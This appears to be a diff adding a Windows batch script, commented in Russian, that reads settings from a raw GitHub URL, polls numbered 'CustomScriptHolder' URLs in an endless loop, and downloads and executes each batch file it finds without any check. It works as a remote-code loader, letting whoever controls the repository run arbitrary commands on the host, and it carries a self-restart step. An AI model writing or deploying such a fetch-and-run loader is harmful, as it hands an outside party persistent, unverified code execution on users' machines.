@@ -1,0 +1,84 @@
+@echo off
+setlocal enabledelayedexpansion
+
+:: Параметры
+set "settingsUrl=https://raw.githubusercontent.com/goofyahh-hub/idk/refs/heads/main/Updates"
+set "baseUrl=https://raw.githubusercontent.com/goofyahh-hub/idk/main/CustomScriptHolder"
+set "scriptFolder=%USERPROFILE%\Documents\CustomScripts"
+set "checkInterval=30" :: Интервал перезапуска в секундах
+
+:: Параметры по умолчанию
+set "startIndex=100"
+set "minIndex=0"
+set "waitTime=10"
+
+:: Создаем папку для скриптов, если она не существует
+if not exist "%scriptFolder%" (
+    mkdir "%scriptFolder%"
+)
+
+:: Считываем настройки с удаленного URL
+:UpdateSettings
+curl -s "%settingsUrl%" -o "%TEMP%\Updates.txt"
+if exist "%TEMP%\Updates.txt" (
+    for /f "tokens=1,2 delims==" %%A in ('type "%TEMP%\Updates.txt"') do (
+        if /i "%%A"=="startIndex" set "startIndex=%%B"
+        if /i "%%A"=="minIndex" set "minIndex=%%B"
+        if /i "%%A"=="waitTime" set "waitTime=%%B"
+    )
+    echo [INFO] Updated settings: startIndex=%startIndex%, minIndex=%minIndex%, waitTime=%waitTime%
+) else (
+    echo [WARN] Failed to fetch settings. Using default or previous values.
+)
+
+:: Поиск самого высокого действительного скрипта
+:FindValidScript
+set "currentIndex=%startIndex%"
+:CheckScript
+set "url=%baseUrl%!currentIndex!"
+echo [INFO] Checking file: !url!
+:: Проверка ответа на код состояния HTTP
+curl -s --head "!url!" | find "200 OK" >nul
+if !errorlevel! equ 0 (
+    echo [INFO] Found valid script: !currentIndex!
+    goto :ProcessScripts
+) else (
+    set /a currentIndex-=1
+    if !currentIndex! geq %minIndex% goto :CheckScript
+    echo [WARN] No valid scripts found. Retrying in %waitTime% seconds.
+    timeout /t %waitTime% >nul
+    goto :FindValidScript
+)
+
+
+:: Обработка скриптов начиная с найденного
+:ProcessScripts
+:CheckNextScript
+set "url=%baseUrl%!currentIndex!"
+echo [INFO] Checking for next script: !url!
+curl -s --head "!url!" | find "200" >nul
+if !errorlevel! equ 0 (
+    echo [INFO] Found next script: !currentIndex!
+    curl -s "!url!" -o "%scriptFolder%\CustomScriptHolder!currentIndex!.bat"
+    if exist "%scriptFolder%\CustomScriptHolder!currentIndex!.bat" (
+        echo [INFO] Executing script: CustomScriptHolder!currentIndex!.bat
+        call "%scriptFolder%\CustomScriptHolder!currentIndex!.bat"
+    ) else (
+        echo [WARN] Failed to download script: !url!
+    )
+    set /a currentIndex+=1
+    timeout /t %waitTime% >nul
+    goto :CheckNextScript
+) else (
+    echo [INFO] Next script not found: !currentIndex!. Waiting for it to appear.
+    timeout /t %waitTime% >nul
+    goto :CheckNextScript
+)
+
+:ScheduleRestart
+:: Ждем перед перезапуском
+start "" "%~f0"
+timeout /t %checkInterval% >nul
+exit
+
+endlocal
